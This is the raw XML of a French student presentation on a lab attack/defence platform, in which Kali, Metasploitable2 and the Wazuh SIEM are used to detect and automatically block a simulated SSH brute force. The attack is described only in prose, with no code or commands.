                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Mes scripts restent basiques : pas de niveau de gravité, pas de lien entre les événements. Il existe des solutions SIEM complètes comme </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>, Splunk ou ELK qui font ça en détail — j'ai choisi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>, plus léger pour mon PC. La chaîne de détection fonctionne comme ça : Metasploitable2 envoie ses logs via Syslog, ils arrivent au </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Manager, qui génère une alerte quand il détecte un brute force.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="209" name="Google Shape;20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extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1243700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fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>  Pour vérifier cette chaîne avec l'attaque que j'ai réalisée, j'ai simulé une tentative SSH échouée sur Metasploitable2. Le détail de l'alerte confirme tout : IP 192.168.56.110, log identique à auth.log — chaîne validée de bout en bout.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:br>
              <a:rPr lang="fr-FR"/>
            </a:br>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="224" name="Google Shape;224;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extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12661930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Pour valider tout le scénario depuis Kali, j'ai enchaîné les quatre étapes d'attaque demandées. Pour le brute force, Hydra a encore échoué à cause du même problème d'algorithmes. J'ai donc créé mon propre script avec </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>expect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>, qui utilise le client SSH normal pour forcer les anciens algorithmes. Et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> a bien détecté en temps réel les tentatives faites par ce script.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="260" name="Google Shape;26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sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Ensuite, j'ai voulu que </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> détecte et bloque tout seul, sans script externe. J'ai essayé d'installer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> directement sur la machine cible, mais ça n'a pas marché. Je me suis donc appuyé sur ce qui était déjà en place, et j'ai réussi : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> détecte et bloque l'attaque automatiquement, en une seconde, sans intervention humaine.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="291" name="Google Shape;291;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fr-FR" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>  Pour conclure, ce projet m'a permis de faire une boucle complète entre attaque et défense, jusqu'à atteindre mon objectif : un SIEM capable de détecter et bloquer automatiquement, sans intervention humaine. Comme perspective, je pense que l'IA pourrait apporter beaucoup à ce type de projet dans le futur — c'est une piste que j'aimerais explorer pour le faire évoluer.  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:br>
              <a:rPr lang="fr-FR" dirty="0"/>
            </a:br>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="337" name="Google Shape;33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49" name="Google Shape;349;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9.jpg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image18.jpg"/></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2.jpg"/><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jpg"/><Relationship Id="rId7"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jp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pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Google Shape;17;p3" descr="logo_bism.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4693920" y="146304"/>
            <a:ext cx="2804160" cy="999744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Google Shape;19;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048000" y="1149533"/>
            <a:ext cx="6096000" cy="902788"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:buSzPts val="1300"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1733" b="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HESTIM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1733" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1733" dirty="0">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:buSzPts val="1300"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1733" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>École </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1733" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>d'ingénierie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1733" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> et de management  Casablanca</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Google Shape;20;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="2069446"/>
            <a:ext cx="8534400" cy="725713"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Projet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> de Fin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>d'étude</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>présenté</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>vue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>l'obtention</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> du diplôme</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1867" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Licence</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Professionnelle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> : Administration et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cybersécurité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> des Systèmes et Réseaux </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Informatiques</a:t>
            </a:r>
            <a:endParaRPr sz="1867" dirty="0" err="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="21" name="Google Shape;21;p3"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="853440" y="2830576"/>
            <a:ext cx="10485120" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="31750" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="2E74B5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="sm" len="sm"/>
            <a:tailEnd type="none" w="sm" len="sm"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Google Shape;22;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="846184" y="3023036"/>
            <a:ext cx="10485120" cy="743131"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:buSzPts val="2600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3467" b="1" dirty="0"/>
              <a:t>Conception et mise </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3467" b="1" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3467" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3467" b="1" dirty="0" err="1"/>
              <a:t>œuvre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3467" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3467" b="1" dirty="0" err="1"/>
              <a:t>d'une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3467" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3467" b="1" dirty="0" err="1"/>
              <a:t>plateforme</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3467" b="1" dirty="0"/>
              <a:t> de simulation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3467" b="1" dirty="0" err="1"/>
              <a:t>Attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3467" b="1" dirty="0"/>
              <a:t> / Défense sous Unix</a:t>
            </a:r>
            <a:endParaRPr sz="3467" b="1" dirty="0">
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Google Shape;23;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="831669" y="3918858"/>
            <a:ext cx="10485120" cy="640079"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Simulation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/Défense via Kali Linux, Supervision </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> SIEM et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Réponse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Automatisée</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1867" dirty="0" err="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="24" name="Google Shape;24;p3"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="795383" y="4579257"/>
            <a:ext cx="10485120" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="31750" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="2E74B5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="sm" len="sm"/>
            <a:tailEnd type="none" w="sm" len="sm"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Google Shape;25;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1036320" y="4775200"/>
            <a:ext cx="2438400" cy="463296"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5B9BD5"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="121900" tIns="121900" rIns="121900" bIns="121900" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr sz="1867"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Google Shape;26;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1036320" y="4775200"/>
            <a:ext cx="2438400" cy="463296"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:buClr>
                <a:srgbClr val="FFFFFF"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Encadré par</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Google Shape;27;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4511040" y="4775200"/>
            <a:ext cx="3169920" cy="463296"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5B9BD5"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="121900" tIns="121900" rIns="121900" bIns="121900" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr sz="1867"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Google Shape;28;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4511040" y="4775200"/>
            <a:ext cx="3169920" cy="463296"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:buClr>
                <a:srgbClr val="FFFFFF"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Soutenu le 20 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Septemb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 2026 par</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
